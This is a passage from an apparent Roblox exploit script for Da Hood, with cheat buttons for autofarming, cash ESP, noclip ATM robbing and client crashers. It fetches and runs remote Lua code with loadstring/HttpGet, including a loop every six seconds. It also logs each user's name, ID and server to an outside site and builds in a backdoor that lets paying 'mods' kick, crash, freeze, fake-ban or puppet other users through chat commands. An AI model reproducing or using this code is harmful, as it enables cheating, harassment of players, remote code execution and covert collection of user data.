  loadstring(game:HttpGet("https://raw.githubusercontent.com/dylannpro123/enclosed/main/resources/wow", true))()
 end
)
fun:Button(
    "PP Bat",
    function()
        local d = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
  local k = game.Workspace.Ignored.Shop["[Bat] - $250"]
  game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = k.Head.CFrame + Vector3.new(0, 3, 0)
  if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - k.Head.Position).Magnitude <= 50 then
   wait(.2)
   fireclickdetector(k:FindFirstChild("ClickDetector"), 4)
   toolf = game.Players.LocalPlayer.Backpack:WaitForChild("[Bat]")
   toolf.Parent = game.Players.LocalPlayer.Character
   wait()
   game.Players.LocalPlayer.Character:WaitForChild("[Bat]")
   game.Players.LocalPlayer.Character:WaitForChild("[Bat]").Grip = CFrame.new(-2.4000001, -0.699999988, 0, 0, 1, -0, -1, 0, -0, 0, 0, 1)
   game.Players.LocalPlayer.Character:WaitForChild("[Bat]").GripForward = Vector3.new(0, -1, -0)
   game.Players.LocalPlayer.Character:WaitForChild("[Bat]").GripPos = Vector3.new(1.2111, 1.11114, 1.8111)
   game.Players.LocalPlayer.Character:WaitForChild("[Bat]").GripUp = Vector3.new(-500000, 404, 5000000)
   game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(d)
  end
 end
)

fun:Button(
    "Autoclicker [V]",
    function()
        local Player = game:GetService("Players").LocalPlayer
  local Mouse = Player:GetMouse()
  local Clicking = false
  Mouse.KeyDown:Connect(function(Key)
   if Key == "v" then
    Clicking = not Clicking
    if Clicking == true then
     repeat
      mouse1click()
      wait(0.001)
     until Clicking == false
    end
   end
  end)
 end
)

local cashmods = serv:Channel("Cash")

cashmods:Toggle(
    "Cash-Aura",
    false,
    function(auto) -- // this picks up all nearby cash
        if auto then
   NotifyLibrary.Notify({
    Title = "Cash-Aura",
    Description = "Toggled to: True",
    Duration = 2
   })
            BooleanValues['CashAura'] = true
        else
   NotifyLibrary.Notify({
    Title = "Cash-Aura",
    Description = "Toggled to: False",
    Duration = 2
   })
            BooleanValues['CashAura'] = false
        end
    end
)

cashmods:Button(
    "Bring Cash ( DONT PICK UP )",
    function()
        for e, v in pairs(game.Workspace.Ignored.Drop:GetChildren()) do
            if v.Name == "MoneyDrop" then
                v.Position = game.Players.LocalPlayer.Character.Head.CFrame.p + Vector3.new(0, 1, 0)
                v.Anchored = false
            end
        end
    end
)

cashmods:Button(
    "Cash ESP",
    function()
        local ESPholder = Instance.new("Folder", game.CoreGui)
  function cham(object)
   if object.Name == "MoneyDrop" then
    local a = Instance.new("BoxHandleAdornment", ESPholder)
    a.Adornee = object
    a.AlwaysOnTop = true
    a.ZIndex = 10
    a.Size = object.Size
    a.Transparency = 0.3
    a.Color = object.BrickColor
    local bill = object:WaitForChild("BillboardGui")
    bill.AlwaysOnTop = true
    bill.Size = UDim2.new(2, 10, 1, 5)
    spawn(function()
     while true do
      if object.Parent.ChildRemoving:wait() == object then
       a:Destroy()
       break
      end
     end
    end)
   end
  end
  for i, v in next, game.Workspace.Ignored.Drop:GetChildren() do
   cham(v)
  end
  game.Workspace.Ignored.Drop.ChildAdded:connect(cham)
 end
)

-- // autofarms

local af = serv:Channel("Autofarms")
af:Button(
 "Auto-Skinny",
 function()
  local player = game.Players.LocalPlayer
  local playerposit = CFrame.new(-84.2903137, 25.4502373, -632.315063, 0.0326573513, 6.83068393e-08, -0.999466658, 7.3860158e-09, 1, 6.85846331e-08, 0.999466658, -9.62186775e-09, 0.0326573513)
  if not game.Players.LocalPlayer.Character:FindFirstChild("[Lettuce]") then
   player.Character.HumanoidRootPart.CFrame = playerposit
   local ClickClick = game:GetService("Workspace").Ignored.Shop["[Lettuce] - $5"]:FindFirstChild("ClickDetector")
   for i = 1, 200 do
    wait(0.9)
    fireclickdetector(ClickClick)
    wait(0.4)
    game.Players.LocalPlayer.Backpack:FindFirstChild("[Lettuce]").Parent = player.Character
    wait(0.5)
    game:GetService("Players").LocalPlayer.Character["[Lettuce]"]:Activate()
   end
  end
 end
)
af:Button(
    "Auto-Muscle",
    function()
        while true do
   wait()
   if not game.Players.LocalPlayer.Character:FindFirstChild("[HeavyWeights]") then
    wait()
    local k = game.Workspace.Ignored.Shop["[HeavyWeights] - $250"]
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = k.Head.CFrame + Vector3.new(0, 3, 0)
    if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - k.Head.Position).Magnitude <= 50 then
     wait(.2)
     fireclickdetector(k:FindFirstChild("ClickDetector"), 4)
    end
   end
   if not game.Players.LocalPlayer.Character:FindFirstChild("[HeavyWeights]") then
    tool = game.Players.LocalPlayer.Backpack:WaitForChild("[HeavyWeights]")
    tool.Parent = game.Players.LocalPlayer.Character
   end
   game:GetService("VirtualUser"):ClickButton1(Vector2.new())
   local d = Vector3.new(-1006.99, -51.1542, -1014.33)
   game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(d)
  end
 end
)

af:Button(
    " ATM Autofarm",
    function()
        _G.rob = true

  noclip = true
  game:GetService("RunService").Stepped:connect(function()
   if noclip then
    game.Players.LocalPlayer.Character.Humanoid:ChangeState(11)
   end
  end)
  plr = game.Players.LocalPlayer
  mouse = plr:GetMouse()
  mouse.KeyDown:connect(function(key)
 
   if key == "b" then
    noclip = not noclip
    game.Players.LocalPlayer.Character.Humanoid:ChangeState(11)
   end
  end)
 
  local a = game.Workspace.Cashiers:GetChildren()
  for b = 1, #a do
   local c = a[b]
   c.Name = "CASHIER" .. b
  end
  for d, e in pairs(game.Workspace:GetDescendants()) do
   if e:IsA("Seat") then
    e:Destroy()
   end
  end
  for f, g in pairs(game.Workspace.MAP.Map["Da Furniture"]:GetChildren()) do
   if g then
    if g.Name == "Part" then
     g.CanCollide = false
    end
   end
  end
  for h, i in pairs(game.Workspace.MAP.Map["Ubi's Resturant"]:GetChildren()) do
   if i then
    if i.Name == "Part" then
     if i.Size ~= Vector3.new(48, 3.25, 80) then
      i.CanCollide = false
     end
    end
   end
  end
  for j, k in pairs(game.Workspace.MAP.Map["Gas Station"]["Gas Station"]:GetChildren()) do
   if k then
    if k.Name == "Part" then
     if k.Size ~= Vector3.new(68, 1, 56) then
      k.CanCollide = false
     end
    end
   end
  end
  function toTarget(l, m, n)
   local o = game:service "TweenService"
   local p = TweenInfo.new((m - l).Magnitude / 170, Enum.EasingStyle.Quad)
   local q = tick()
   local r, s =
    pcall(
     function()
     local r = o:Create(game.Players.LocalPlayer.Character["HumanoidRootPart"], p, {CFrame = n})
     r:Play()
    end
    )
   if not r then
    return s
   end
   for i, v in pairs(workspace.Cashiers:GetChildren()) do
    if v:WaitForChild("Humanoid").Health > 0 then
     local cf = v.Open.CFrame
     local lv = cf.lookVector
     game.workspace.Players[game.Players.LocalPlayer.Name].HumanoidRootPart.CFrame = cf + (lv * Vector3.new(-1, 0, 0))
     return v
    end
   end
  end
  local function t(u, v)
   local w = (u.Position - v.Position).magnitude
   if w <= 50 then
    fireclickdetector(v:FindFirstChild("ClickDetector"))
    return w
   end
  end
  while _G.rob == true do
   wait()
   repeat
    for x, y in pairs(game.Workspace.Ignored.Drop:GetChildren()) do
     if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - y.Position).Magnitude <= 50 then
      local z = y
      t(game.Players.LocalPlayer.Character.HumanoidRootPart, y)
      wait()
     end
    end
    if not game.Players.LocalPlayer.Character:FindFirstChild("Combat") then
     local A = game.Players.LocalPlayer.Backpack:FindFirstChild("Combat")
     A.Parent = game.Players.LocalPlayer.Character
    end
    wait()
    for b, B in pairs(game.Workspace.Cashiers:GetChildren()) do
     wait()
     if B:FindFirstChild("Humanoid") then
      if B.Humanoid.Health > 0 then
       wait()
       if B.Name ~= "CASHIER5" then
        B.Open.Orientation = Vector3.new(0, 90, 0)
        B.Open.Size = Vector3.new(4,4,4)
        B.Open.CanCollide = false
       end
       if B.Name == "CASHIER5" then
        --B.Open.Orientation = Vector3.new(0, 180, 0)
        B.Open.Position = B.Open.Position - Vector3.new(0,0,0)
        B.Open.Size = Vector3.new(4,4,4)
        B.Open.CanCollide = false
       end
       wait()
       poss = B.Open.Position - Vector3.new(0, 0, 0)
       posc = B.Open.CFrame - Vector3.new(-1, 0, 0)
       toTarget(game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position, poss, posc)
       repeat
        wait()
       until (game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position - poss).Magnitude <
        50 or
        _G.rob == false or
        B.Humanoid.Health <= 0
       repeat
        if not game.Players.LocalPlayer.Character:FindFirstChild("Combat") then
         local A = game.Players.LocalPlayer.Backpack:FindFirstChild("Combat")
         A.Parent = game.Players.LocalPlayer.Character
        end
        toTarget(
         game:GetService("Players").LocalPlayer.Character:WaitForChild("HumanoidRootPart").Position,
         poss,
         posc
        )
        wait(0)
        game:GetService("VirtualUser"):Button1Down(Vector2.new())
       until B.Humanoid.Health <= 0 or _G.rob == false
       wait(0)
       for C = 5, 50 do
        wait()
        for x, y in pairs(game.Workspace.Ignored.Drop:GetChildren()) do
         if
          (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - y.Position).Magnitude <=
           50
         then
          if y:IsA("Part") then
           local z = y
           t(game.Players.LocalPlayer.Character.HumanoidRootPart, y)
           wait()
          end
         end
        end
       end
      end
     end
    end
   until _G.rob == false
  end
 end
)

af:Button(
    "Auto-Box",
    function()
        while true do
            wait()
            if not game.Players.LocalPlayer.Character:FindFirstChild("Combat") then
                local tool = game.Players.LocalPlayer.Backpack:FindFirstChild("Combat")
                tool.Parent = game.Players.LocalPlayer.Character
            end
            for V, W in pairs(game.Workspace.MAP.Map.ArenaBOX:GetChildren()) do
                wait()
                warn(W)
                if W.Name == "PunchingBagInGame" then
                    wait()
                    posMx = W:FindFirstChild("pretty ransom").Position - Vector3.new(0, 0, 0)
                    poscMx = W:FindFirstChild("pretty ransom").CFrame - Vector3.new(3, 0, 0)
                    ToShoes(game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position, posMx, poscMx)
                    while true do
                        if not game.Players.LocalPlayer.Character:FindFirstChild("Combat") then
                            local tool = game.Players.LocalPlayer.Backpack:FindFirstChild("Combat")
                            tool.Parent = game.Players.LocalPlayer.Character
                        end
                        ToShoes(game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position, posMx, poscMx)
                        wait(.5)
                        game:GetService("VirtualUser"):ClickButton1(Vector2.new())
                    end
                end
            end
        end
    end
)

af:Label("Reset when you want to stop autofarming!")
-- // Selling Tools
local sellingtools = serv:Channel("Selling Tools")

sellingtools:Toggle(
    "Auto-Drop",
    false,
    function(auto) -- // this function does auto - drop
        if auto then
   NotifyLibrary.Notify({
    Title = "Auto-Drop",
    Description = "Toggled to: True",
    Duration = 2
   })
            BooleanValues['Dropping'] = true
        else
   NotifyLibrary.Notify({
    Title = "Auto-Drop",
    Description = "Toggled to: False",
    Duration = 2
   })
            BooleanValues['Dropping'] = false
        end
    end
)

sellingtools:Button(
    "Load Encrypt Crasher",
    function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/LPrandom/lua-projects/master/dahoodcrasher.lua"))()
    end
)

sellingtools:Button(
 "Crasher",
 function()
 -- Gui to Lua
-- Version: 3.2

-- Instances:

local cooluixd = Instance.new("ScreenGui")
local GUIFrame = Instance.new("Frame")
local dhcpicture = Instance.new("ImageLabel")
local TextButton = Instance.new("TextButton")

--Properties:

cooluixd.Name = "cooluixd"
cooluixd.Parent = game.CoreGui

GUIFrame.Name = "GUI-Frame"
GUIFrame.Parent = cooluixd
GUIFrame.BackgroundColor3 = Color3.fromRGB(172, 0, 0)
GUIFrame.BorderColor3 = Color3.fromRGB(172, 0, 0)
GUIFrame.Position = UDim2.new(0.405305356, 0, 0.020858895, 0)
GUIFrame.Size = UDim2.new(0, 307, 0, 103)

dhcpicture.Name = "dhcpicture"
dhcpicture.Parent = GUIFrame
dhcpicture.BackgroundColor3 = Color3.fromRGB(172, 0, 0)
dhcpicture.BorderColor3 = Color3.fromRGB(172, 0, 0)
dhcpicture.Position = UDim2.new(0.404242396, 0, 0, 0)
dhcpicture.Size = UDim2.new(0, 57, 0, 52)
dhcpicture.Image = "rbxassetid://9088030133"

TextButton.Parent = GUIFrame
TextButton.BackgroundColor3 = Color3.fromRGB(145, 28, 18)
TextButton.BorderColor3 = Color3.fromRGB(255, 16, 224)
TextButton.Position = UDim2.new(-0.00186077296, 0, 0.511847019, 0)
TextButton.Size = UDim2.new(0, 307, 0, 50)
TextButton.Font = Enum.Font.Oswald
TextButton.Text = "CRASH"
TextButton.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton.TextScaled = true
TextButton.TextSize = 14.000
TextButton.TextWrapped = true
TextButton.MouseButton1Click:Connect(function()
    TextButton.Text = "Crashing..."
    local Tool = 'Wallet' 
    local plr = game.Players.LocalPlayer
    local char = plr.Character
    local bp = plr.Backpack
    game:GetService("RunService").RenderStepped:Connect(function()
    if char:FindFirstChild(Tool) then
        char:FindFirstChild(Tool).Parent = bp
        else
        bp:FindFirstChild(Tool).Parent = char
    end
    end)
end)
end 
)

-- // Credits
local Credits = serv:Channel("Credits")

Credits:Label("Founder / Developer - tacs#0009")
Credits:Label("Developer - remorse#9230")
Credits:Label("Target Helper - dawn#9990")
Credits:Label("https://discord.gg/enclosed")
Credits:Button(
 "Click to copy discord!",
 function()
 setclipboard("discord.gg/enclosed")
end
)
Credits:Button(
 "Redirect To Discord",
 function()
  local httpservice = game:GetService("HttpService")
 local http_request = http_request
 if syn then
  http_request = syn.request
 elseif SENTINEL_V2 or KRNL_LOADED then
  http_request = request
 end
 if http_request then
  http_request({
   Url = "http://127.0.0.1:6463/rpc?v=1",
   Method = "POST",
   Headers = {
    ["Content-Type"] = "application/json",
    Origin = "https://discord.com"
   },
   Body = httpservice:JSONEncode({
    cmd = "INVITE_BROWSER",
    nonce = httpservice:GenerateGUID(false),
    args = {
     code = "enclosed"
    }
   })
  })
 end
end)

-- // mod perms

local url = game:HttpGet("http://38.242.134.182:3388/whitelists")

local isamod = false
if string.find(url,game.Players.LocalPlayer.UserId) then
    isamod = true
end

if isamod == true then
    game.StarterGui:SetCore("SendNotification", {
        Title = "Enclosed Mod Perms"; 
        Text = "thx for buying mod perms!";
        Icon = "rbxassetid://10630558969";
        Duration = 5;
        })  
    end
local player = game.Players.LocalPlayer
local prefix = "."
function ban()
    ScreenGui = Instance.new("ScreenGui")
    Frame = Instance.new("Frame")
    TextLabel = Instance.new("TextLabel")

    ScreenGui.Parent = game.CoreGui
    ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

    Frame.Parent = ScreenGui
    Frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    Frame.Position = UDim2.new(0.063149482, 0, 0.0797545984, 0)
    Frame.Size = UDim2.new(0, 100, 0, 100)
    Frame.BackgroundTransparency = 1

    TextLabel.Parent = Frame
    TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    TextLabel.BackgroundTransparency = 1
    TextLabel.Position = UDim2.new(4.36999989, 0, 0.5, 0)
    TextLabel.Size = UDim2.new(0, 200, 0, 50)
    TextLabel.SizeConstraint = Enum.SizeConstraint.RelativeXX
    TextLabel.Font = Enum.Font.SourceSans
    TextLabel.TextColor3 = Color3.fromRGB(194, 0, 0)
    TextLabel.TextSize = 35.000
    TextLabel.Text = "Jail Timer: 9999999999999"
end
local fucking = false
local function cmds(msg,plr)
    local operator = game.Players:GetPlayerByUserId(plr)
    msg = string.split(msg," ")
    msg[1] = string.lower(msg[1])
    if not isamod then
        if msg[1] == prefix.."bring" then
            if string.sub(string.lower(player.Name),1,string.len(msg[2])) == string.lower(msg[2]) or msg[2] == "." then
                player.Character.HumanoidRootPart.CFrame = operator.Character.HumanoidRootPart.CFrame
            end
        elseif msg[1] == prefix.."freeze" then
            if string.sub(string.lower(player.Name),1,string.len(msg[2])) == string.lower(msg[2]) or msg[2] == "." then
                player.Character.HumanoidRootPart.Anchored = true
            end
        elseif msg[1] == prefix.."thaw" then
            if string.sub(string.lower(player.Name),1,string.len(msg[2])) == string.lower(msg[2]) or msg[2] == "." then
                player.Character.HumanoidRootPart.Anchored = false
            end
        elseif msg[1] == prefix.."reset" then
            if string.sub(string.lower(player.Name),1,string.len(msg[2])) == string.lower(msg[2]) or msg[2] == "." then
                for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
                    if v:IsA("MeshPart") or v:IsA("Accessory") or v.Name == "HumanoidRootPart" or v.Name == "Humanoid" then 
                        pcall(function()
                            v:Destroy()
                        end)
                    end
                end
            end
        elseif msg[1] == prefix.."fling" then
            if string.sub(string.lower(player.Name),1,string.len(msg[2])) == string.lower(msg[2]) or msg[2] == "." then
                for i=1,math.random(99,100) do
                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(math.random(1000,9999),math.random(1000,9999),math.random(1000,9999))
                    wait()
                end
            end
        elseif msg[1] == prefix.."kick" then
            if string.sub(string.lower(player.Name),1,string.len(msg[2])) == string.lower(msg[2]) or msg[2] == "." then
                if msg[3] == nil then
                    msg[3] = "Premium user has kicked you, gg/enclosed"
                end
                player:Kick(msg[3])
            end
        elseif msg[1] == prefix.."fakeban" then
            if string.sub(string.lower(player.Name),1,string.len(msg[2])) == string.lower(msg[2]) or msg[2] == "." then
                player:Kick("PERMA-BAN")
                wait(1)
                while true do end -- just incase they got anti kick
            end
        elseif msg[1] == prefix.."jailban" then
            if string.sub(string.lower(player.Name),1,string.len(msg[2])) == string.lower(msg[2]) or msg[2] == "." then
                player.Character.HumanoidRootPart.CFrame = game:GetService("Workspace").Ignored.JAILLOCATION2.CFrame
                wait(0.15)
                ban()
            end
        elseif msg[1] == prefix.."crash" then
            if string.sub(string.lower(player.Name),1,string.len(msg[2])) == string.lower(msg[2]) or msg[2] == "." then
                while true do end
            end
        elseif msg[1] == prefix.."refresh" then
            if string.sub(string.lower(player.Name),1,string.len(msg[2])) == string.lower(msg[2]) or msg[2] == "." then
                for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
                    if v:IsA("MeshPart") or v:IsA("Accessory") or v.Name == "HumanoidRootPart" or v.Name == "Humanoid" then 
                        pcall(function()
                            v:Destroy()
                        end)
                    end
                end
            end
        elseif msg[1] == prefix.."pray" then
            if string.sub(string.lower(player.Name),1,string.len(msg[2])) == string.lower(msg[2]) or msg[2] == "." then
                local Animation = Instance.new("Animation",game.Players.LocalPlayer.Character)
                local Name_ForAnim = "JoeMommaPray_"..tostring(math.random(1,1000))
                Animation.Name = Name_ForAnim
                Animation.AnimationId = "rbxassetid://3487719500"
                local Pray = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Animation)
                Pray:Play()
                Pray.Stopped:Connect(function()
                    game.Players.LocalPlayer.Character:FindFirstChild(Name_ForAnim):Destroy()
                end)
            end
        elseif msg[1] == prefix.."pepper" then
            if string.sub(string.lower(player.Name),1,string.len(msg[2])) == string.lower(msg[2]) or msg[2] == "." then
                local OFF = Instance.new("ScreenGui")
                local Frame = Instance.new("Frame")
                
                local Name_ = math.random(99,25252).."+++".."lol" 
                OFF.Name = Name_
                OFF.Parent = game.CoreGui
                OFF.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
                            
                Frame.Parent = OFF
                Frame.AnchorPoint = Vector2.new(0.5, 0.5)
                Frame.BackgroundColor3 = Color3.fromRGB(255,140,0)
                Frame.BorderColor3 = Color3.fromRGB(255,140,0)
                Frame.Transparency = 0.8
                Frame.BorderSizePixel = 100
                Frame.Position = UDim2.new(0.5, 0, 0.5, 0)
                Frame.Size = UDim2.new(1, 0, 1, 0)
                
                for i=1,5 do
                    game.Players.LocalPlayer.Character.Humanoid.Health = game.Players.LocalPlayer.Character.Humanoid.Health-20
                    wait(1.4)
                end
                game.Players.LocalPlayer.CharacterAdded:Wait()
                game.CoreGui:FindFirstChild(Name_):Destroy()
            end
        elseif msg[1] == prefix.."flash" then
            if string.sub(string.lower(player.Name),1,string.len(msg[2])) == string.lower(msg[2]) or msg[2] == "." then
                local OFF = Instance.new("ScreenGui")
                local Frame = Instance.new("Frame")
                           
                local Name_ = math.random(99,25252).."+++".."lol" 
                OFF.Name = Name_
                OFF.Parent = game.CoreGui
                OFF.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
                            
                Frame.Parent = OFF
                Frame.AnchorPoint = Vector2.new(0.5, 0.5)
                Frame.BackgroundColor3 = Color3.fromRGB(255,255,255)
                Frame.BorderColor3 = Color3.fromRGB(255,255,255)
                Frame.BorderSizePixel = 100
                Frame.Position = UDim2.new(0.5, 0, 0.5, 0)
                Frame.Size = UDim2.new(1, 0, 1, 0)
                for i=1,100 do
                    Frame.Transparency = Frame.Transparency+0.01
                    wait(.1)
                end
                game.CoreGui:FindFirstChild(Name_):Destroy()
            end
        elseif msg[1] == prefix.."seize" then
            if string.sub(string.lower(player.Name),1,string.len(msg[2])) == string.lower(msg[2]) or msg[2] == "." then
                game.Players.LocalPlayer.Character.LowerTorso:BreakJoints()
                for i=1,10 do
                    local Part = Instance.new("Part",workspace)
                    Part.Name = "Sieze_"..tostring(i)
                    Part.Size = Vector3.new(.5,.5,.5)
                    Part.Color = Color3.fromRGB(255,255,255)
                    Part.Transparency = 0.6
                    Part.CFrame = CFrame.new(game.Players.LocalPlayer.Character.Head.Position.X,game.Players.LocalPlayer.Character.Head.Position.Y+1,game.Players.LocalPlayer.Character.Head.Position.Z)
                    wait(0.01)
                end
                game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest"):FireServer("R.I.P.","All")
                game.Players.LocalPlayer.Character.Humanoid.Health = 0
                game.Players.LocalPlayer.CharacterAdded:Wait()
                for i,v in pairs(workspace:GetChildren()) do
                    if v:IsA("Part") or string.find(v.Name,"Sieze") then
                        v:Destroy()
                    end
                end
            end
        elseif msg[1] == prefix.."say" then
            if string.sub(string.lower(player.Name),1,string.len(msg[2])) == string.lower(msg[2]) or msg[2] == "." then
                local success, err = pcall(function()
                    local final_msg = ""
                    local new_msg = {}
                    for i,v in pairs(msg) do
                        table.insert(new_msg,v)
                    end
                    
                    table.remove(new_msg,1)
                    table.remove(new_msg,1)
                    for i,v in pairs(new_msg) do
                        final_msg = final_msg..""..v.." "
                    end
                    game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest"):FireServer(final_msg,"All")
                end)                
            end
  elseif msg[1] == prefix.."jumpscare" then
            if string.sub(string.lower(player.Name),1,string.len(msg[2])) == string.lower(msg[2]) or msg[2] == "." then
                function Scare()
                    local ScreenGui = Instance.new("ScreenGui")
                    local ImageLabel = Instance.new("ImageLabel")

                    local image = {"109129888", "146577131", "1309130490", "1119705746", "7479500080"}

                    local image2 = {"7236404523", "6150329916", "8195739170", "8628815817"}

                    ScreenGui.Parent = game.CoreGui
                    ScreenGui.Name = "SCREAM"
                    ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

                    ImageLabel.Parent = ScreenGui
                    ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
                    ImageLabel.Position = UDim2.new(0, 0, -0.000674206764, 0)
                    ImageLabel.Size = UDim2.new(1, 0, 1.00857365, 0)
                    ImageLabel.Image = "rbxassetid://" .. image[math.random(1, #image)]
                    ImageLabel.Visible = false
                    ImageLabel.BackgroundTransparency = 1
                    ImageLabel.Visible = true
                    local sound = Instance.new("Sound")
                    sound.Parent = game.Workspace
                    sound.SoundId = "rbxassetid://" .. image2[math.random(1, #image2)]
                    sound.Volume = 200
                    sound:Play()
                    for i = 0, 1, 0.1 do
                        wait(0.05)
                        ImageLabel.ImageTransparency = i
                    end
                    sound.Ended:Wait()
                    sound:Destroy()
                    ScreenGui:Destroy()
                end
                if not game.CoreGui:FindFirstChild("SCREAM") then
                    Scare()
                end
            end
        elseif msg[1] == prefix.."benx" then
            if string.sub(string.lower(player.Name),1,string.len(msg[2])) == string.lower(msg[2]) or msg[2] == "." then
                fucking = true
                local target = game.Players:FindFirstChild(player.Name)
                local directionForward = -0.5
                local BackwardsBoolean = false
                local Crouch = game.Players.LocalPlayer.Character:FindFirstChildWhichIsA('Humanoid'):LoadAnimation(game:GetService("ReplicatedStorage").ClientAnimations.Crouching)
                Crouch.Looped = true
                Crouch:Play()
                while fucking do
                    if not fucking then
                        Crouch:Stop()
                        break
                    end
                    if target.Character then
                        if BackwardsBoolean == true then
                            directionForward=directionForward-0.1
                        else
                            directionForward=directionForward+0.1
                        end
                        if directionForward >= 3 then
                            BackwardsBoolean = true
                        elseif directionForward < 1 then
                            BackwardsBoolean = false
                        end
                        player.Character.HumanoidRootPart.CFrame = operator.Character.HumanoidRootPart.CFrame+operator.Character.HumanoidRootPart.CFrame.lookVector*directionForward
                    end
                    wait(0.01)
                end
            end
        elseif msg[1] == prefix.."unbenx" then
            if string.sub(string.lower(player.Name),1,string.len(msg[2])) == string.lower(msg[2]) or msg[2] == "." then
                fucking = false
                wait(2)
                for i,v in pairs(game.Players.LocalPlayer.Character.Humanoid:GetPlayingAnimationTracks()) do 
                    if v:IsA("AnimationTrack") then
                        v:Stop()
                    end
                end
            end
        end
    end
end

game:service"ReplicatedStorage".DefaultChatSystemChatEvents.OnMessageDoneFiltering.OnClientEvent:Connect(function(data)
    local name = data.FromSpeaker
    local msg = data.Message
    if string.find(url,game:service"Players"[name].UserId) then
        cmds(msg, game:service"Players"[name].UserId)
    end
end)

coroutine.resume(coroutine.create(function()
    while wait(6) do
        local succes, err = pcall(function()
            if player.Character.Head:FindFirstChild("OriginalSize") then
                player.Character.Head:FindFirstChild("OriginalSize"):Destroy()
            end
            loadstring(game:HttpGet("https://raw.githubusercontent.com/dylannpro123/enclosed/main/resources/Skids.lua"))()
        end)
    end
end))

-- // LOGS

if isamod == true then
    game:HttpGet('https://enclosed.live/premiumuser.php?user='..game:GetService('Players').LocalPlayer.Name..'&userid='..game:GetService('Players').LocalPlayer.UserId..'&JobId='..game.JobId..'&Script=DaHood&GameId='..Game.PlaceId);
elseif isamod == false then
    game:HttpGet('https://enclosed.live/encloseduser.php?user='..game:GetService('Players').LocalPlayer.Name..'&userid='..game:GetService('Players').LocalPlayer.UserId..'&JobId='..game.JobId..'&Script=DaHood&GameId='..Game.PlaceId);
end

TargetT:Button(
 "Premium Check Target",
 function()
  if string.find(url, game:GetService("Players")[TargetV].UserId) then
   notify("Premium Check","User Has Premium",5)
  else
   notify("Premiucm Check","No Premium :(",5)
  end
 end
)